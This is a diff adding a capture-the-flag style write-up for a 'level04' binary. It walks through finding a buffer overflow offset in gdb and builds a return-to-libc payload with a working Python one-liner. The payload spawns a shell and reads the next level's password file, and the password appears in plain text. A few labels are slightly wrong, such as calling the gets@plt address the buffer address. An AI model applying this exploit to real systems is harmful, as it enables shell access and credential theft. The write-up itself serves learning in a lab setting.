@@ -1,0 +1,42 @@
+When I launch this binary, it asks to give it a shellcode, then it exits printing "child is exiting..."
+
+When I disassemble it I see that the program is forked at the beginning, then in the child it reads from stdin on a buffer of 32 characters and on the parent it kills the child if it calls the exec() function.
+
+As the buffer is filled in the child, to find EIP offset with gdb I need to pass this command:
+
+(gdb) set follow-fork-mode child
+
+to make gdb follow the child and not the parrent.
+
+Then I input a very long pattern in gdb and find out that EIP offset is 156.
+
+Let's do an other return to libc exploitation:
+
+I need system()'s addres, "/bin/sh"'s address and the buffer's address.
+
+(gdb) print system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) find __libc_start_main,+99999999,"/bin/sh"
+0xf7f897ec
+
+(gdb) disas main
+...
+0x0804875e <+150>:	call   0x80484b0 <gets@plt>
+...
+
+system() => 0xf7e6aed0
+"/bin/sh" => 0xf7f897ec
+buffer => 0x080484b0
+
+The payload will look like this:
+
+"A" * 156 + <system addr> + <buffer addr> + <".bin/sh addr">
+
+The final exploit is:
+
+$ (python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "\xb0\x84\x04\x08" + "\xec\x97\xf8\xf7"' ; cat) | ./level04
+Give me some shellcode, k
+whoami
+level05
+cat /home/users/level05/.pass
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
